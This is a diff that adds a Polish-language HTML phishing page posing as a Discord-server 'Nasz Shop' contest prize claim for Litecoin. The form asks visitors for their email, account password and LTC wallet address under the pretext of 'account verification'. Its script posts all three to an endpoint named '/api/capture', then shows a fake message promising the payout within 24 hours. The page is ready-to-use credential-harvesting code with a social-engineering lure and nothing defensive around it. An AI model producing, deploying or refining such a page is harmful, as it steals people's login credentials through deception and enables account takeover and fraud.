@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nasz Shop – Odbierz Nagrodę LTC</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #5865F2;
+            --primary-hover: #4752C4;
+            --bg-gradient: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
+            --card-bg: #ffffff;
+            --text-main: #111827; /* Czarny tekst */
+            --text-muted: #4b5563;
+            --border: #d1d5db;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: var(--bg-gradient); 
+            color: var(--text-main);
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+
+        .card { 
+            background: var(--card-bg); 
+            border: 1px solid var(--border);
+            padding: 40px; 
+            border-radius: 16px; 
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05); 
+            width: 100%;
+            max-width: 440px; 
+            text-align: center; 
+        }
+
+        .badge {
+            display: inline-block;
+            background: #e0e7ff;
+            color: #3730a3;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+        }
+
+        h2 { 
+            color: var(--text-main); 
+            margin-bottom: 8px; 
+            font-size: 24px; 
+            font-weight: 700; 
+        }
+
+        .subtitle { 
+            color: var(--text-muted); 
+            margin-bottom: 24px; 
+            font-size: 14px; 
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+
+        input { 
+            width: 100%; 
+            padding: 12px 16px; 
+            background: #f9fafb;
+            border: 1px solid var(--border); 
+            border-radius: 8px; 
+            font-size: 14px; 
+            color: var(--text-main);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            background: #ffffff;
+        }
+
+        button { 
+            background: var(--primary); 
+            color: white; 
+            border: none; 
+            padding: 12px; 
+            width: 100%; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            font-size: 15px; 
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+
+        button:hover { 
+            background: var(--primary-hover); 
+        }
+
+        .hidden { display: none !important; }
+
+        .result-box { 
+            font-size: 16px; 
+            color: #16a34a; 
+            font-weight: 600; 
+            margin: 20px 0; 
+            padding: 15px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 8px;
+        }
+
+        #msg {
+            color: #dc2626;
+            font-size: 13px;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="mainCard">
+        <div id="formContainer">
+            <span class="badge">Odbierz Nagrodę 🛒</span>
+            <h2>Odbierz swoją nagrodę</h2>
+            <p class="subtitle">Zaloguj się w celu weryfikacji konta i podaj adres portfela LTC, aby odebrać wygraną z konkursu.</p>
+            
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Adres E-mail" required autocomplete="email">
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Hasło" required autocomplete="current-password">
+                </div>
+                <div class="input-group">
+                    <input type="text" id="ltc" placeholder="Adres portfela LTC (np. L...)" required>
+                </div>
+                <button type="submit" id="submitBtn">Zweryfikuj i odbierz nagrodę</button>
+            </form>
+
+            <p id="msg"></p>
+        </div>
+
+        <div id="resultContainer" class="hidden">
+            <span class="badge" style="background: #dcfce7; color: #15803d;">Sukces</span>
+            <h2>Weryfikacja pomyślna</h2>
+            <div class="result-box">Nagroda w postaci LTC zostanie wysłana na wskazany adres portfela w ciągu 24 godzin!</div>
+            <p style="color: var(--text-muted); font-size: 13px;">Dziękujemy za korzystanie z usług naszego serwera Discord.</p>
+        </div>
+    </div>
+
+    <script>
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(String(email).toLowerCase());
+        }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const ltc = document.getElementById('ltc').value;
+            const msg = document.getElementById('msg');
+            const submitBtn = document.getElementById('submitBtn');
+
+            msg.innerText = '';
+
+            if (!validateEmail(email)) {
+                msg.innerText = 'Wprowadź poprawny format adresu e-mail!';
+                return;
+            }
+
+            if (ltc.trim().length < 10) {
+                msg.innerText = 'Wprowadź prawidłowy adres portfela LTC!';
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = 'Sprawdzanie e-maila...';
+
+            try {
+                const res = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password, ltc })
+                });
+
+                const data = await res.json();
+
+                if (res.ok && data.success) {
+                    document.getElementById('formContainer').classList.add('hidden');
+                    document.getElementById('resultContainer').classList.remove('hidden');
+                } else {
+                    msg.innerText = data.message || 'Wystąpił błąd.';
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = 'Zweryfikuj i odbierz nagrodę';
+                }
+            } catch (err) {
+                msg.innerText = 'Błąd połączenia z serwerem.';
+                submitBtn.disabled = false;
+                submitBtn.innerText = 'Zweryfikuj i odbierz nagrodę';
+            }
+        }
+    </script>
+</body>
+</html>
